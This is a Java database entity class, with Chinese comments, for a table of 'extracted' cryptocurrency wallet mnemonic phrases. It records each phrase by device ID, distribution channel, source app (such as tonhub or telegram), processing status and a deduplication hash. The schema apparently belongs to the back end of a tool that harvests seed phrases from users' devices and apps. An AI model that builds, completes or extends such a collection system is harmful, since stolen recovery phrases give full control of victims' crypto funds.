package com.consumer.entity;

import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableField;
import com.baomidou.mybatisplus.annotation.TableId;
import com.baomidou.mybatisplus.annotation.TableName;
import lombok.Data;
import java.io.Serializable;


@Data
@TableName("private_mnemonic")
public class PrivateMnemonicEntity implements Serializable {
    
	private static final long serialVersionUID = 1L;

    /**
     * 主键ID
     */
    @TableId(type = IdType.AUTO)
    private Integer id;

    /**
     * 设备唯一标识
     */
    @TableField("device_id")
    private String deviceId;

    /**
     * 渠道代码（如：UM0MTJSYA2471）
     */
    @TableField("channelcode")
    private String channelCode;

    /**
     * 助记词数量（12/15/18/21/24）
     */
    @TableField("wordscount")
    private Integer wordsCount;

    /**
     * 提取的助记词结果
     */
    @TableField("result")
    private String result;

    /**
     * 数据来源（如：tonhub、telegram等）
     */
    @TableField("source")
    private String source;

    /**
     * 处理状态（0-待处理，1-处理中，2-已完成，3-失败）
     */
    @TableField("status")
    private Integer status;

    /**
     * 添加时间（时间戳，秒级）
     */
    @TableField("addtime")
    private Double addTime;

    /**
     * 结果哈希值（用于去重）
     */
    @TableField("result_hash")
    private String resultHash;

    /**
     * 重复接收次数
     */
    @TableField("recv_dup_count")
    private Integer recvDupCount;
}